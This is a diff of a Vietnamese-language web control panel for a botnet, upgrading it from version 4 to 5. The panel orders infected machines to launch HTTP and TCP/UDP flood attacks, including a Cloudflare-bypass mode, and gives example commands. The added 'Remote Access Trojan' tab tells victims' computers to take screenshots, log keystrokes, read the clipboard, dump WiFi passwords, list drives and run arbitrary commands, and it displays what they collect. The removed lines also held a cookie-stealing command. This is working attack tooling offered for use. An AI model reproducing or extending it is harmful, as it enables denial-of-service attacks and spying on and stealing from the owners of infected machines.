@@ -1,9 +1,8 @@
 <!DOCTYPE html>
 <html lang="vi">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Botnet C2 v4</title>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Botnet C2 v5</title>
 <style>
 :root{--bg:#0c0c14;--card:#13131f;--red:#e74c3c;--green:#2ecc71;--blue:#3498db;--yellow:#f39c12;--text:#bbb;--border:#1e1e2a}
 *{margin:0;padding:0;box-sizing:border-box}
@@ -33,7 +32,6 @@ h3{color:var(--red);margin-bottom:10px;font-size:14px}
 label{display:block;color:#888;font-size:10px;margin-bottom:3px}
 input,select,textarea{width:100%;padding:7px 9px;background:#161622;color:#ddd;border:1px solid #222;border-radius:2px;font-size:12px;outline:none;font-family:Consolas,monospace}
 input:focus,select:focus,textarea:focus{border-color:var(--blue)}
-textarea{resize:vertical;min-height:50px}
 button{padding:7px 14px;border:none;border-radius:2px;cursor:pointer;font-weight:bold;font-size:11px;transition:.2s}
 .btn-red{background:var(--red);color:#fff}.btn-red:hover{background:#c0392b}
 .btn-green{background:var(--green);color:#fff}.btn-green:hover{background:#27ae60}
@@ -43,315 +41,84 @@ button{padding:7px 14px;border:none;border-radius:2px;cursor:pointer;font-weight
 .btn-group{display:flex;gap:5px;flex-wrap:wrap;margin:6px 0}
 .card{background:var(--card);border:1px solid var(--border);border-radius:4px;padding:12px;margin-bottom:10px}
 .log-box{background:#0a0a0f;border:1px solid #1a1a25;border-radius:2px;padding:8px;height:250px;overflow-y:auto;font-family:Consolas;font-size:10px;color:#888}
-.log-box div{margin:1px 0}
-.cmd-line{color:#0f0}.info-line{color:#3498db}.err-line{color:#e74c3c}.warn-line{color:#f39c12}
+.cmd-line{color:#0f0}.info-line{color:#3498db}.err-line{color:#e74c3c}
 .badge{display:inline-block;padding:2px 5px;border-radius:2px;font-size:9px;margin:1px}
 .badge-l7{background:#e74c3c22;color:#e74c3c}.badge-l4{background:#3498db22;color:#3498db}
 .method-help{font-size:10px;color:#555;margin-top:4px;line-height:1.6}
 </style>
 </head>
 <body>
-
-<!-- SIDEBAR -->
 <div class="sidebar">
-    <div class="sidebar-header">
-        <h2>☠️ C2 PANEL v4</h2>
-        <span id="botCount" style="font-size:10px;color:#888">0 bot</span>
-    </div>
-    <div style="padding:4px 8px">
-        <select id="filter" onchange="renderBots()" style="font-size:10px;padding:5px">
-            <option value="ALL">Tất cả</option>
-            <option value="ONLINE">Online</option>
-            <option value="ATTACKING">Đang tấn công</option>
-            <option value="IDLE">Rảnh</option>
-        </select>
-    </div>
+    <div class="sidebar-header"><h2>☠️ C2 PANEL v5</h2><span id="botCount" style="font-size:10px;color:#888">0 bot</span></div>
+    <div style="padding:4px 8px"><select id="filter" onchange="renderBots()" style="font-size:10px;padding:5px"><option value="ALL">Tất cả</option><option value="ONLINE">Online</option><option value="ATTACKING">Đang tấn công</option><option value="IDLE">Rảnh</option></select></div>
     <div class="bot-list" id="botList"></div>
-    <div class="sidebar-footer">
-        🟢 Online: <b id="onlineCount">0</b> | 🔴 Attack: <b id="attackCount">0</b>
-    </div>
+    <div class="sidebar-footer">🟢 Online: <b id="onlineCount">0</b> | 🔴 Attack: <b id="attackCount">0</b></div>
 </div>
-
-<!-- MAIN -->
 <div class="main">
     <div class="tabs">
         <div class="tab active" onclick="switchTab(0)">⚔️ TẤN CÔNG</div>
         <div class="tab" onclick="switchTab(1)">💻 CMD</div>
         <div class="tab" onclick="switchTab(2)">📊 THÔNG TIN</div>
-        <div class="tab" onclick="switchTab(3)">📋 LOG</div>
+        <div class="tab" onclick="switchTab(3)">🐀 RAT</div>
+        <div class="tab" onclick="switchTab(4)">📋 LOG</div>
     </div>
-
     <!-- TAB 0: TẤN CÔNG -->
     <div class="tab-content active" id="tab0">
-        <div class="card">
-            <h3>⚔️ GỬI LỆNH TẤN CÔNG</h3>
-            <div class="row">
-                <div class="col" style="min-width:200px">
-                    <label>🎯 MỤC TIÊU (URL hoặc IP:PORT)</label>
-                    <input type="text" id="target" placeholder="http://target.com hoặc 1.2.3.4:80">
-                </div>
-                <div class="col" style="max-width:180px">
-                    <label>⚔️ PHƯƠNG THỨC</label>
-                    <select id="method">
-                        <optgroup label="Layer 7 - HTTP">
-                            <option value="GET_FLOOD">GET_FLOOD</option>
-                            <option value="POST_FLOOD">POST_FLOOD</option>
-                            <option value="CF_BYPASS">CF_BYPASS</option>
-                            <option value="SLOWLORIS">SLOWLORIS</option>
-                            <option value="HEAD_FLOOD">HEAD_FLOOD</option>
-                            <option value="RANDOM_UA">RANDOM_UA</option>
-                            <option value="MIXED_FLOOD">MIXED_FLOOD</option>
-                        </optgroup>
-                        <optgroup label="Layer 4 - TCP/UDP">
-                            <option value="TCP_SYN">TCP_SYN</option>
-                            <option value="TCP_CONNECT">TCP_CONNECT</option>
-                            <option value="UDP_FLOOD">UDP_FLOOD</option>
-                            <option value="TCP_ACK">TCP_ACK</option>
-                            <option value="TCP_RST">TCP_RST</option>
-                        </optgroup>
-                    </select>
-                </div>
-            </div>
-            <div class="row">
-                <div class="col" style="max-width:130px">
-                    <label>🧵 SỐ LUỒNG</label>
-                    <input type="number" id="threads" value="100">
-                </div>
-                <div class="col" style="max-width:130px">
-                    <label>⏱️ THỜI GIAN (s)</label>
-                    <input type="number" id="duration" value="60">
-                </div>
-                <div class="col" style="max-width:200px">
-                    <label>🌐 PROXY FILE (tùy chọn)</label>
-                    <input type="text" id="proxyFile" placeholder="proxy.txt">
-                </div>
-            </div>
-            <div class="btn-group">
-                <button class="btn-red" onclick="sendAttack('ALL')">🔥 TẤN CÔNG TẤT CẢ</button>
-                <button class="btn-red" onclick="sendAttack('SELECTED')">🎯 TẤN CÔNG ĐÃ CHỌN</button>
-                <button class="btn-green" onclick="sendStop('ALL')">⏹ DỪNG TẤT CẢ</button>
-            </div>
-            <div class="method-help">
-                📖 <b>Cách dùng:</b> Chọn method → Nhập target → Nhập threads + duration → Chọn bot → Bấm TẤN CÔNG<br>
-                📝 <b>VD lệnh thủ công:</b> <code>node GET_FLOOD.js http://target.com 200 120 proxy.txt</code>
-            </div>
+        <div class="card"><h3>⚔️ GỬI LỆNH TẤN CÔNG</h3>
+            <div class="row"><div class="col" style="min-width:200px"><label>🎯 MỤC TIÊU</label><input type="text" id="target" placeholder="http://target.com hoặc IP:Port"></div><div class="col" style="max-width:180px"><label>⚔️ PHƯƠNG THỨC</label><select id="method"><optgroup label="Layer 7"><option>GET_FLOOD</option><option>POST_FLOOD</option><option>CF_BYPASS</option><option>SLOWLORIS</option><option>HEAD_FLOOD</option><option>RANDOM_UA</option><option>MIXED_FLOOD</option></optgroup><optgroup label="Layer 4"><option>TCP_SYN</option><option>TCP_CONNECT</option><option>UDP_FLOOD</option><option>TCP_ACK</option><option>TCP_RST</option></optgroup></select></div></div>
+            <div class="row"><div class="col" style="max-width:130px"><label>🧵 SỐ LUỒNG</label><input type="number" id="threads" value="100"></div><div class="col" style="max-width:130px"><label>⏱️ THỜI GIAN</label><input type="number" id="duration" value="60"></div><div class="col" style="max-width:200px"><label>🌐 PROXY FILE</label><input type="text" id="proxyFile" placeholder="proxy.txt"></div></div>
+            <div class="btn-group"><button class="btn-red" onclick="sendAttack('ALL')">🔥 TẤN CÔNG TẤT CẢ</button><button class="btn-red" onclick="sendAttack('SELECTED')">🎯 TẤN CÔNG ĐÃ CHỌN</button><button class="btn-green" onclick="sendStop('ALL')">⏹ DỪNG TẤT CẢ</button></div>
+            <div class="method-help">📖 <b>Cách dùng CMD:</b> <code>method target threads duration [proxy]</code><br>VD: <code>GET_FLOOD http://target.com 200 120 proxy.txt</code></div>
         </div>
     </div>
-
     <!-- TAB 1: CMD -->
     <div class="tab-content" id="tab1">
-        <div class="card">
-            <h3>💻 COMMAND LINE (GIẢ LẬP CMD WINDOWS)</h3>
-            <div style="background:#0a0a0f;border:1px solid #1a1a25;border-radius:3px;padding:10px;font-family:Consolas;font-size:11px">
-                <div style="color:#0f0;margin-bottom:5px">Microsoft Windows [Version 10.0]</div>
-                <div style="color:#0f0;margin-bottom:8px">(c) Botnet C2 Console</div>
-                <div style="display:flex;align-items:center">
-                    <span style="color:#0f0;white-space:nowrap">C:\Botnet&gt;</span>
-                    <input id="cmdInput" style="flex:1;background:transparent;border:none;color:#fff;font-family:Consolas;font-size:11px;padding:3px 5px;margin-left:5px" placeholder="Nhập lệnh..." onkeydown="if(event.key==='Enter')sendCmd()">
-                </div>
-            </div>
-            <div class="btn-group" style="margin-top:8px">
-                <select id="cmdTarget" style="max-width:180px">
-                    <option value="ALL">→ Tất cả bot</option>
-                </select>
-                <button class="btn-yellow" onclick="sendCmd()">▶️ THỰC THI</button>
-                <button class="btn-gray" onclick="document.getElementById('cmdInput').value=''">✕ XÓA</button>
-            </div>
-            <div class="method-help" style="margin-top:8px">
-                <b>📝 ĐỊNH DẠNG LỆNH:</b><br>
-                <code>method target threads duration [proxyfile]</code><br>
-                <b>VD Layer 7:</b> <code>GET_FLOOD http://target.com 200 120 proxy.txt</code><br>
-                <b>VD Layer 4:</b> <code>TCP_SYN 1.2.3.4:80 500 300</code><br>
-                <b>Methods L7:</b> GET_FLOOD | POST_FLOOD | CF_BYPASS | SLOWLORIS | HEAD_FLOOD | RANDOM_UA | MIXED_FLOOD<br>
-                <b>Methods L4:</b> TCP_SYN | TCP_CONNECT | UDP_FLOOD | TCP_ACK | TCP_RST<br>
-                <b>Lệnh đặc biệt:</b> <code>getinfo</code> - Lấy thông tin hệ thống | <code>cookies</code> - Lấy cookie
-            </div>
+        <div class="card"><h3>💻 COMMAND LINE</h3>
+            <div style="background:#0a0a0f;border:1px solid #1a1a25;border-radius:3px;padding:10px;font-family:Consolas;font-size:11px"><div style="color:#0f0;margin-bottom:5px">Microsoft Windows [Version 10.0]</div><div style="color:#0f0;margin-bottom:8px">(c) Botnet C2 Console</div><div style="display:flex;align-items:center"><span style="color:#0f0;white-space:nowrap">C:\Botnet&gt;</span><input id="cmdInput" style="flex:1;background:transparent;border:none;color:#fff;font-family:Consolas;font-size:11px;padding:3px 5px;margin-left:5px" placeholder="Nhập lệnh..." onkeydown="if(event.key==='Enter')sendCmd()"></div></div>
+            <div class="btn-group" style="margin-top:8px"><select id="cmdTarget" style="max-width:180px"><option value="ALL">→ Tất cả bot</option></select><button class="btn-yellow" onclick="sendCmd()">▶️ THỰC THI</button><button class="btn-gray" onclick="document.getElementById('cmdInput').value=''">✕ XÓA</button></div>
+            <div class="log-box" id="cmdLog"><div class="cmd-line">C:\Botnet&gt; Sẵn sàng nhận lệnh...</div></div>
         </div>
-        <div class="log-box" id="cmdLog"><div class="cmd-line">C:\Botnet&gt; Sẵn sàng nhận lệnh...</div></div>
     </div>
-
     <!-- TAB 2: THÔNG TIN -->
     <div class="tab-content" id="tab2">
-        <div class="card">
-            <h3>📊 THÔNG TIN BOT</h3>
-            <div class="btn-group">
-                <button class="btn-blue" onclick="getBotInfo('ALL')">📊 LẤY THÔNG TIN TẤT CẢ</button>
-                <button class="btn-blue" onclick="getBotInfo('SELECTED')">📊 LẤY THÔNG TIN ĐÃ CHỌN</button>
-            </div>
-            <div id="botInfoContainer" style="margin-top:8px"></div>
+        <div class="card"><h3>📊 THÔNG TIN BOT</h3><div class="btn-group"><button class="btn-blue" onclick="getBotInfo('ALL')">📊 LẤY THÔNG TIN TẤT CẢ</button><button class="btn-blue" onclick="getBotInfo('SELECTED')">📊 LẤY THÔNG TIN ĐÃ CHỌN</button></div><div id="botInfoContainer" style="margin-top:8px"></div></div>
+    </div>
+    <!-- TAB 3: RAT -->
+    <div class="tab-content" id="tab3">
+        <div class="card"><h3>🐀 REMOTE ACCESS TROJAN</h3>
+            <div class="btn-group"><button class="btn-blue" onclick="sendRAT('ALL','screenshot')">📸 CHỤP MÀN HÌNH</button><button class="btn-blue" onclick="sendRAT('SELECTED','screenshot')">📸 CHỤP (ĐÃ CHỌN)</button><button class="btn-yellow" onclick="sendRAT('ALL','keylog_start')">⌨️ KEYLOG</button><button class="btn-green" onclick="sendRAT('ALL','keylog_stop')">⏹ DỪNG KEYLOG</button></div>
+            <div class="btn-group"><button class="btn-blue" onclick="sendRAT('ALL','clipboard')">📋 CLIPBOARD</button><button class="btn-blue" onclick="sendRAT('ALL','wifi')">📶 MẬT KHẨU WIFI</button><button class="btn-blue" onclick="sendRAT('ALL','files')">📁 LIỆT KÊ Ổ ĐĨA</button><button class="btn-blue" onclick="sendRAT('ALL','sysinfo')">💻 SYSTEM INFO</button></div>
+            <div class="btn-group"><button class="btn-red" onclick="sendRAT('ALL','cmd')">💻 CHẠY LỆNH CMD</button><input type="text" id="ratCmd" placeholder="Nhập lệnh cmd..." style="max-width:300px"></div>
+        </div>
+        <div class="card"><h3>📊 DỮ LIỆU THU THẬP</h3>
+            <select id="ratBotSelect" onchange="loadRatData()"><option value="">Chọn bot...</option></select>
+            <select id="ratTypeSelect" onchange="loadRatData()"><option value="screenshot">Screenshot</option><option value="keylog">Keylog</option><option value="clipboard">Clipboard</option><option value="wifi">WiFi</option><option value="files">Files</option><option value="sysinfo">System Info</option><option value="cmd_result">CMD Result</option></select>
+            <button class="btn-blue" onclick="loadRatData()">🔄 TẢI</button>
+            <div id="ratDataContainer" style="margin-top:10px;background:#0a0a0f;padding:10px;border-radius:3px;font-family:Consolas;font-size:11px;max-height:300px;overflow-y:auto;white-space:pre-wrap;color:#0f0"></div>
         </div>
     </div>
-
-    <!-- TAB 3: LOG -->
-    <div class="tab-content" id="tab3">
-        <div class="card">
-            <h3>📋 NHẬT KÝ</h3>
-            <button class="btn-gray" onclick="clearLog()" style="margin-bottom:6px">🗑️ XÓA LOG</button>
-            <div class="log-box" id="logBox"></div>
-        </div>
+    <!-- TAB 4: LOG -->
+    <div class="tab-content" id="tab4">
+        <div class="card"><h3>📋 NHẬT KÝ</h3><button class="btn-gray" onclick="clearLog()" style="margin-bottom:6px">🗑️ XÓA LOG</button><div class="log-box" id="logBox"></div></div>
     </div>
 </div>
-
 <script>
-const API = '/api';
-let bots = {};
-let selectedBot = null;
-
-// ===== LOG =====
-function addLog(msg, cls=''){
-    let box = document.getElementById('logBox');
-    box.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
-    box.scrollTop = box.scrollHeight;
-}
-function addCmdLog(msg, cls='cmd-line'){
-    let box = document.getElementById('cmdLog');
-    box.innerHTML += `<div class="${cls}">${msg}</div>`;
-    box.scrollTop = box.scrollHeight;
-}
-function clearLog(){document.getElementById('logBox').innerHTML='';}
-
-// ===== SWITCH TAB =====
-function switchTab(i){
-    document.querySelectorAll('.tab').forEach((t,j)=>t.classList.toggle('active',j===i));
-    document.querySelectorAll('.tab-content').forEach((t,j)=>t.classList.toggle('active',j===i));
-}
-
-// ===== RENDER BOTS =====
-function renderBots(){
-    let filter = document.getElementById('filter').value;
-    let container = document.getElementById('botList');
-    let html = '', online=0, attacking=0;
-    for(let id in bots){
-        let b = bots[id];
-        if(!b.online) continue;
-        online++;
-        if(b.status==='ATTACKING') attacking++;
-        if(filter==='ATTACKING' && b.status!=='ATTACKING') continue;
-        if(filter==='IDLE' && b.status!=='ONLINE') continue;
-        if(filter==='ONLINE' && b.status==='OFFLINE') continue;
-        let cls = b.status==='ATTACKING'?'attacking':'online';
-        let sel = selectedBot===id?' selected':'';
-        html += `<div class="bot-item ${cls}${sel}" onclick="selectBot('${id}')">
-            <div class="name">${b.hostname||id.substring(0,8)}</div>
-            <div class="info">🟢 ${b.status} | CPU:${b.cpu||0}% | RAM:${b.ram||0}%</div>
-            ${b.target?`<div class="info">🎯 ${b.target}</div>`:''}
-        </div>`;
-    }
-    container.innerHTML = html || '<div style="padding:10px;color:#555">Chưa có bot</div>';
-    document.getElementById('botCount').textContent = online + ' bot';
-    document.getElementById('onlineCount').textContent = online;
-    document.getElementById('attackCount').textContent = attacking;
-    let cmdTarget = document.getElementById('cmdTarget');
-    cmdTarget.innerHTML = '<option value="ALL">→ Tất cả bot</option>';
-    for(let id in bots) if(bots[id].online) cmdTarget.innerHTML += `<option value="${id}">${bots[id].hostname||id.substring(0,8)}</option>`;
-}
-
-// ===== SELECT BOT =====
-function selectBot(id){
-    selectedBot = id;
-    document.querySelectorAll('.bot-item').forEach(el=>el.classList.remove('selected'));
-}
-
-// ===== SEND ATTACK =====
-async function sendAttack(target){
-    let botId = target==='ALL'?'ALL':selectedBot;
-    if(!botId){alert('Chọn bot!');return}
-    let data = {
-        botId, method: document.getElementById('method').value,
-        target: document.getElementById('target').value,
-        threads: document.getElementById('threads').value,
-        duration: document.getElementById('duration').value,
-        proxyFile: document.getElementById('proxyFile').value
-    };
-    if(!data.target){alert('Nhập mục tiêu!');return}
-    await fetch(API+'/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
-    addLog(`🚀 ${data.method} → ${data.target} [${botId}]`,'cmd-line');
-}
-
-async function sendStop(target){
-    let botId = target==='ALL'?'ALL':selectedBot;
-    await fetch(API+'/stop',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId})});
-    addLog(`⏹ Dừng: ${botId}`,'info-line');
-}
-
-// ===== CMD =====
-function sendCmd(){
-    let input = document.getElementById('cmdInput').value.trim();
-    let target = document.getElementById('cmdTarget').value;
-    if(!input){addCmdLog('C:\\Botnet&gt; Vui lòng nhập lệnh','err-line');return}
-    addCmdLog('C:\\Botnet&gt; '+input,'cmd-line');
-    
-    let parts = input.split(' ');
-    let cmd = parts[0].toLowerCase();
-    
-    if(cmd==='getinfo'){
-        fetch(API+'/getinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId:target})});
-        addCmdLog('  Đã gửi yêu cầu lấy thông tin...','info-line');
-    }else if(cmd==='cookies'){
-        fetch(API+'/getinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId:target,type:'cookies'})});
-        addCmdLog('  Đã gửi yêu cầu lấy cookie...','info-line');
-    }else if(parts.length>=3){
-        let data = {
-            botId: target,
-            method: parts[0],
-            target: parts[1],
-            threads: parts[2],
-            duration: parts[3]||'60',
-            proxyFile: parts[4]||''
-        };
-        fetch(API+'/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
-        addCmdLog(`  Đã gửi lệnh: ${data.method} → ${data.target}`,'info-line');
-    }else{
-        addCmdLog(`  Lỗi: Định dạng sai. VD: GET_FLOOD http://target.com 200 120`,'err-line');
-    }
-    document.getElementById('cmdInput').value = '';
-}
-
-// ===== GET INFO =====
-async function getBotInfo(target){
-    let botId = target==='ALL'?'ALL':selectedBot;
-    if(!botId){alert('Chọn bot!');return}
-    await fetch(API+'/getinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId,type:'full'})});
-    
-    // Hiển thị thông tin đã có
-    let container = document.getElementById('botInfoContainer');
-    let html = '';
-    for(let id in bots){
-        let b = bots[id];
-        if(target==='SELECTED' && id!==botId) continue;
-        if(!b.online) continue;
-        html += `<div class="card" style="margin:6px 0;padding:10px">
-            <b>${b.hostname}</b> (${id.substring(0,8)})
-            <div style="font-size:11px;margin-top:4px">
-                CPU: ${b.cpu||'...'}% | RAM: ${b.ram||'...'}% | GPU: ${b.gpu||'...'}<br>
-                Status: ${b.status} | Target: ${b.target||'N/A'}
-            </div>
-            <div style="margin-top:6px">
-                <a href="${API}/downloadinfo/${id}" download class="btn-blue" style="text-decoration:none;padding:5px 10px;font-size:10px;display:inline-block">📥 TẢI FILE .TXT</a>
-            </div>
-        </div>`;
-    }
-    container.innerHTML = html || '<div style="color:#555">Chưa có dữ liệu. Bấm "LẤY THÔNG TIN" để bot báo cáo về.</div>';
-}
-
-// ===== REFRESH =====
-async function refreshBots(){
-    try{
-        let res = await fetch(API+'/bots');
-        bots = await res.json();
-        renderBots();
-        // Tự động cập nhật info container nếu đang ở tab 2
-        if(document.getElementById('tab2').classList.contains('active')){
-            getBotInfo('ALL');
-        }
-    }catch(e){}
-}
-
-// ===== INIT =====
-refreshBots();
-setInterval(refreshBots, 3000);
-addLog('✅ C2 Panel v4 đã sẵn sàng','info-line');
-addCmdLog('C:\\Botnet&gt; Hệ thống sẵn sàng. Gõ help để xem hướng dẫn.','cmd-line');
+const API='/api';let bots={},selectedBot=null;
+function addLog(msg,cls=''){let b=document.getElementById('logBox');b.innerHTML+=`<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;b.scrollTop=b.scrollHeight}
+function addCmdLog(msg,cls='cmd-line'){let b=document.getElementById('cmdLog');b.innerHTML+=`<div class="${cls}">${msg}</div>`;b.scrollTop=b.scrollHeight}
+function clearLog(){document.getElementById('logBox').innerHTML=''}
+function switchTab(i){document.querySelectorAll('.tab').forEach((t,j)=>t.classList.toggle('active',j===i));document.querySelectorAll('.tab-content').forEach((t,j)=>t.classList.toggle('active',j===i))}
+function renderBots(){let f=document.getElementById('filter').value,c=document.getElementById('botList'),h='',on=0,at=0;for(let id in bots){let b=bots[id];if(!b.online)continue;on++;if(b.status==='ATTACKING')at++;if(f==='ATTACKING'&&b.status!=='ATTACKING')continue;if(f==='IDLE'&&b.status!=='ONLINE')continue;let cl=b.status==='ATTACKING'?'attacking':'online',sl=selectedBot===id?' selected':'';h+=`<div class="bot-item ${cl}${sl}" onclick="selectBot('${id}')"><div class="name">${b.hostname||id.substring(0,8)}</div><div class="info">🟢 ${b.status} | CPU:${b.cpu||0}% | RAM:${b.ram||0}%</div>${b.target?`<div class="info">🎯 ${b.target}</div>`:''}</div>`}c.innerHTML=h||'<div style="padding:10px;color:#555">Chưa có bot</div>';document.getElementById('botCount').textContent=on+' bot';document.getElementById('onlineCount').textContent=on;document.getElementById('attackCount').textContent=at;let ct=document.getElementById('cmdTarget');ct.innerHTML='<option value="ALL">→ Tất cả bot</option>';for(let id in bots)if(bots[id].online)ct.innerHTML+=`<option value="${id}">${bots[id].hostname||id.substring(0,8)}</option>`;updateRatBotList()}
+function selectBot(id){selectedBot=id}
+async function sendAttack(t){let b=t==='ALL'?'ALL':selectedBot;if(!b){alert('Chọn bot!');return}let d={botId:b,method:document.getElementById('method').value,target:document.getElementById('target').value,threads:document.getElementById('threads').value,duration:document.getElementById('duration').value,proxyFile:document.getElementById('proxyFile').value};if(!d.target){alert('Nhập mục tiêu!');return}await fetch(API+'/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});addLog(`🚀 ${d.method} → ${d.target} [${b}]`,'cmd-line')}
+async function sendStop(t){let b=t==='ALL'?'ALL':selectedBot;await fetch(API+'/stop',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId:b})});addLog(`⏹ Dừng: ${b}`,'info-line')}
+function sendCmd(){let i=document.getElementById('cmdInput').value.trim(),t=document.getElementById('cmdTarget').value;if(!i){addCmdLog('C:\\Botnet&gt; Nhập lệnh!','err-line');return}addCmdLog('C:\\Botnet&gt; '+i,'cmd-line');let p=i.split(' ');if(p[0]==='getinfo'){fetch(API+'/getinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId:t})});addCmdLog('  Đã gửi getinfo','info-line')}else if(p.length>=3){let d={botId:t,method:p[0],target:p[1],threads:p[2],duration:p[3]||'60',proxyFile:p[4]||''};fetch(API+'/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(d)});addCmdLog(`  Đã gửi: ${d.method} → ${d.target}`,'info-line')}else{addCmdLog('  Sai định dạng! VD: GET_FLOOD http://target.com 200 120','err-line')}document.getElementById('cmdInput').value=''}
+async function getBotInfo(t){let b=t==='ALL'?'ALL':selectedBot;if(!b){alert('Chọn bot!');return}await fetch(API+'/getinfo',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId:b})});let c=document.getElementById('botInfoContainer'),h='';for(let id in bots){let bt=bots[id];if(t==='SELECTED'&&id!==b)continue;if(!bt.online)continue;h+=`<div class="card" style="margin:6px 0;padding:10px"><b>${bt.hostname}</b> (${id.substring(0,8)})<div style="font-size:11px;margin-top:4px">CPU: ${bt.cpu||'...'}% | RAM: ${bt.ram||'...'}% | GPU: ${bt.gpu||'...'}<br>Status: ${bt.status} | Target: ${bt.target||'N/A'}</div><div style="margin-top:6px"><a href="${API}/downloadinfo/${id}" download class="btn-blue" style="text-decoration:none;padding:5px 10px;font-size:10px;display:inline-block">📥 TẢI FILE .TXT</a></div></div>`}c.innerHTML=h||'<div style="color:#555">Bấm LẤY THÔNG TIN để bot báo cáo.</div>'}
+async function sendRAT(target,action){let b=target==='ALL'?'ALL':selectedBot;if(!b&&target!=='ALL'){alert('Chọn bot!');return}let p='';if(action==='cmd')p=document.getElementById('ratCmd').value;if(action==='cmd'&&!p){alert('Nhập lệnh!');return}await fetch(API+'/rat',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({botId:b,action,params:p})});addLog(`🐀 RAT: ${action} → ${b}`,'cmd-line')}
+async function loadRatData(){let b=document.getElementById('ratBotSelect').value,t=document.getElementById('ratTypeSelect').value;if(!b)return;try{let r=await fetch(API+'/ratdata/'+b+'/'+t);let j=await r.json();document.getElementById('ratDataContainer').textContent=j.data||'Chưa có dữ liệu'}catch(e){document.getElementById('ratDataContainer').textContent='Lỗi'}}
+function updateRatBotList(){let s=document.getElementById('ratBotSelect');s.innerHTML='<option value="">Chọn bot...</option>';for(let id in bots)if(bots[id].online)s.innerHTML+=`<option value="${id}">${bots[id].hostname||id}</option>`}
+async function refreshBots(){try{let r=await fetch(API+'/bots');bots=await r.json();renderBots()}catch(e){}}
+refreshBots();setInterval(refreshBots,3000);addLog('✅ C2 Panel v5 sẵn sàng','info-line');addCmdLog('C:\\Botnet&gt; Hệ thống sẵn sàng.','cmd-line');
 </script>
 </body>
 </html>
